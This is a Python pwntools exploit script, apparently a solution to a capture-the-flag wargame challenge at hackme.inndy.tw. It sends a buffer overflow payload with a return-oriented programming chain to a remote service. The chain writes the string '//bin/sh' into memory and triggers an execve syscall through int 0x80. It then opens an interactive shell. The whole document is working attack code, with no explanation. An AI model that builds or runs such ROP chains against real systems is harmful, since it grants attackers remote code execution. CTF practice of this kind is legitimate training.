from pwn import *

r = remote("hackme.inndy.tw", 7704)

padding = "AAAAAAAAAAAAAAAA"
mov_edxSUB4_eax_mov_eax_espADD4 = p32(0x805cbb3)
mov_edx_eax = p32(0x807a6f1)
mov_edxADD4_ecx = p32(0x805fc89)
pop_eax = p32(0x806d276)
pop_edx = p32(0x806ecda)
pop_edx_pop_ecx_pop_ebx = p32(0x806ed00)
int0x80 = p32(0x806c943)

bin_sh1 = p32(0x69622f2f)
bin_sh2 = p32(0x68732f6e)

r.sendline(
        padding +
        pop_edx_pop_ecx_pop_ebx +
        p32(0x080eaf04) +
        p32(0) +
        p32(0) +
        mov_edxADD4_ecx +
        pop_eax +
        p32(0x68732f6e) +
        mov_edx_eax +
        pop_eax +
        p32(0x69622f2f) +
        mov_edxSUB4_eax_mov_eax_espADD4 +
        pop_eax +
        p32(11) +
        pop_edx_pop_ecx_pop_ebx +
        p32(0) +
        p32(0) +
        p32(0x080eaf00) +
        int0x80
        )

r.interactive()
